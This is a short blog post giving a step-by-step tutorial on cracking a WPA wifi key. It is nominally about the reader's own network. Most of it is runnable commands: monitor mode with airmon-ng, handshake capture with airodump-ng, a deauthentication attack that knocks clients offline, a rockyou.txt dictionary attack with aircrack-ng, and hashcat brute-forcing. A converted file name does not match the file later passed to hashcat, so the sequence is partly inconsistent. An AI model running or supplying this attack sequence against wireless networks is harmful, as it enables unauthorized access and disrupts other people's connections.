---
title: How to crack WPA wifi key?
layout: post
date: 2024-06-08T22:02:24.311Z
preview: ""
tags: [fun, wifi, security, cracking, wap, wpa, wifite, aircrack-ng, hcxtools, hashcat]
categories: []
type: default
---

## Assumption
You know the wifi key that we want to crack, because your are the owner of this wifi off course. Let take an example with `12345678`. So we will try to crack it.

## With wifite 

### Install

```bash
sudo apt update && sudo apt upgrade -y && sudo apt install -y wifite
```

### Launch
```bash
sudo wifite --wpa
```

Then follow instructions on software.


## With aircrack-ng

### Install

```bash
$ sudo apt update && sudo apt upgrade -y && sudo apt install -y aircrack-ng
```

### Steps

Get your wifi interface name (it should begin by 'wl')
```bash
$ ifconfig
```
or this if your are lazzy :
```bash
ifconfig | grep -e '^wl' | awk -F ':' '{print $1}'
``` 

Switch the wifi interface in Monitor mode
```bash
$ sudo airmon-ng start wlp4s0
```

Set the monitor wifi interface in env
```bash
$ export INT=wlp4s0mon
```

Dump networks
```bash
$ sudo airodump-ng $INT
```

then crtl+c and choose your BSSID
set the BSSID in your env
```bash
$ export BSSID={see_the_BSSID_column}
```
set the channel (see the CH column) in your env
```bash
$ export CH={see_the_CH_column}
```

Capture a handshake
```bash
$ sudo airodump-ng -c $CH --bssid $BSSID -w capture $INT
```

So you can wait for a handshake... or run a deauth attack. 
Open a new terminal
```bash
$ sudo aireplay-ng --deauth 100 -a {see_BSSID_column} -c {see_STATION_column} wlp4s0mon --ignore-negative-one
```
When the mention `WPA handshake: xx:xx:xx:xx:xx:xx` is displayed in the first terminal, 
crtl+c on both terminal windows
then exist from the monitor mode
```bash
$ sudo airmon-ng stop wlp4s0mon
```

## Found the wifi key

### by using dictionnaires 

Do you know rockyou.txt? See [here](https://github.com/zacheller/rockyou). We assume that `12345678` is contained in rockyou.txt (,it is!). So we will use it to find the wifi key from the capture file. 

Let's go.
```bash
$ aircrack-ng -w rockyou.txt capture-01.cap
```
> It can take a few moments :)

### by bruteforcing (ho yeah!)

Ready to burn your CPU? We assume that the wifi key to find is `12345678`. With a lengh of 8 and only digits, any computer is able to find it in few hours, about 3 hours for my old laptop. So we will use it to find the wifi key from the capture file. 

We will use hcxtools, hashcat for that.

#### install hcxtools

hcxtools is a set of tools that are used for capturing and converting WLAN traffic. It provides various functionalities for working with captured packets, such as converting them to hashcat format for password cracking.

```bash
$ sudo apt update && sudo apt upgrade -y && sudo apt install -y hcxtools
```

#### Convert the capture file to hashcat format
```bash
$ hcxpcapngtool capture-01.cap -o capture-01.hccapx
```

#### install hashcat

Hashcat is a powerful open-source password recovery tool. It is designed to crack hashed passwords using various attack modes, such as brute-force, dictionary, and rule-based attacks. 

```bash
$ sudo apt update && sudo apt upgrade -y && sudo apt install -y hashcat
```

#### bruteforce

```bash
$ hashcat -a 3 -m 22000 capture-04.hash ?d?d?d?d?d?d?d?d
```
> 3h/4h later the wifi key has been found. (arround 5100H/s)


